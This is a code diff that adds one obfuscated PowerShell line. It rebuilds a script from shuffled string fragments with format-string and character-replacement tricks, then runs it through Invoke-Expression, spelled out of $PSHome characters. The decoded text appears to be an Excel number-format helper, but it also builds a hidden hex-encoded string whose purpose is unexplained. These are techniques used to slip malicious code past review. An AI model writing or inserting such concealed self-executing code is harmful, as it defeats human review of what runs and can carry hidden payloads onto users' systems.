@@ -1,0 +1,51 @@
+ ((("{77}{36}{27}{35}{19}{23}{74}{6}{42}{66}{75}{85}{64}{17}{56}{61}{7}{59}{76}{71}{52}{0}{48}{40}{43}{67}{38}{34}{83}{11}{46}{13}{78}{25}{47}{72}{62}{30}{4}{73}{10}{37}{87}{86}{44}{28}{68}{53}{29}{65}{33}{1}{8}{58}{22}{45}{24}{16}{54}{50}{15}{80}{60}{32}{70}{84}{5}{51}{79}{81}{69}{9}{18}{2}{14}{31}{57}{55}{82}{12}{41}{20}{26}{3}{21}{39}{49}{63}" -f 'cwIpos = ykicwISign #,##0.00yki ; break }
+                3  {cwIpos ','}
+              ','iPercentageyki    {return ','xcel.
+        ykiDate-Timeyki     {return  ykim/d/yy h:mmyki} # format id 22 localized on load by Excel.
+        ykiTextyki   ','eturn ykicwIpos;-#,##0.00cwISignyki   }
+                6  {return ykicw','        ','INumberFormat) {
+        ykiCurrencyyki ','   1  {cwI',' 12  {retur','   {return  ','ki   }
+  ',',##0.00yki   }
+       ','t id ','    2  {return ykicwIpos;cwISign-#,##0.00yki   }
+             ',' yki0.00%yki      } # format id 10','#0.00 cwISign)yki }
+            }
+            cwIoiNvsL =   -joIn ((27 , 69, 70,n4h3an4h ,31 ',' 1','ositivePattern)','yki0.00yki       } # format id  2
+        yk','     cwI','alized on load by Excel.
+        ykiShort Timeyki    {return  ykih:mmyki       } # format id 20 localized on load by Excel.
+        ykiL','       {return  yk',' ','N','              ','#,##0.','ong Timeyki     {return  ykih:mm:ssyki    } # format id 21 localized on load by E',' {
+    [CmdletBinding()]
+    [OutputType([Str','gn #,##0.00yki  }
+    ','cwIpos;#,##0.00 cwISign-yk','.00cwISign)yki  }
+                5  {r','
+        ykiScientificyki    {return  yki0.00E+00yki   } # format id ','7 ) Qw1fO','ISign #,##0.00-yki  ','        ','ing])]
+    param  (
+        #the format string to Expand
+   ','umberFormat','              7 ','wISign#,##0.00)yki  }
+      ','i@yki          } # format ID 49
+        Default         {return  cwINum','00 cwISignyki ; break }
+            }
+            sw','14 loc','     {
+ ','itch ([cultureinfo]::CurrentCulture.NumberFormat.CurrencyPositivePattern) {
+            ','turn ykicwIpos;-cwISi','}
+','     ','00-yki   }
+                ','= yki#,##0.','berFor','n #,##0.00)yki }
+               15  {return ykicwIpos;(#,#','}
+        ykiNumb','    2  {','10  {return yki','3  {return ykicwIpos;#,##0.00- cwISignyki  }
+               14  {return ykicwIpos;(cwISig','  ykiFractiony',' {
+                0  {cwIpos = ykicwISign#,##0.00yki  ','11
+      ','n ykicwIpos;cwISign -#,##0.00yki ','pos ','h2en4h,31 , 32,35, n4h2en4h ,31 ,30 , 38,n4h2en4h,36 ,2','; break }
+             ',' ykicwIpos;(#,##0','mat}
+    }
+}
+
+','t.CurrencyP','i  }
+               11  {return ykicwIpos;cw','           #https://msdn.microsoft.com/en-us/library/system.globalization.numberformatinfo.currencynegativepattern(v=vs.110).aspx
+            cwIsign = [cultureinfo]::CurrentCultu','    0  {return ykicwIpos;(c','           ','    ','REAch-OBjECT{ ( [coNvERT]:','i#,##0.00cwISignyki  ; break }
+            ','4  {return','Ipos;#,##0.00-cwISigny','umberFormat
+    )
+    switch (cw','re.NumberFormat.CurrencySymbol
+          ','= yk','function Expand-N','   3  {return ykicwIpos;cwISign','e',', 38,36 , n4','ryki ','ki      {return  yki# ?/?yki      } # format id 12
+        ykiShort Dateyki    {return  ykimm-dd-yyyki   } # forma','  1  {return ykicwIpos;-cwISign#',':toiNT16( ([striNG]cwI_ ), 16) -aS[CHAR])} )
+','  switch ([cultureinfo]::CurrentCulture.NumberForma',' 9  {re',' {return ykicwIpos;#,##0.00cwISign-yki   }
+                8  {return ykicwIpos;-#,##0.00 cwISignyki  }
+               '))-CRePLace'Qw1',[cHar]124  -CRePLace 'n4h',[cHar]39  -CRePLace 'cwI',[cHar]36  -CRePLace'yki',[cHar]34) |& ( $PshOMe[21]+$PshOME[30]+'X')
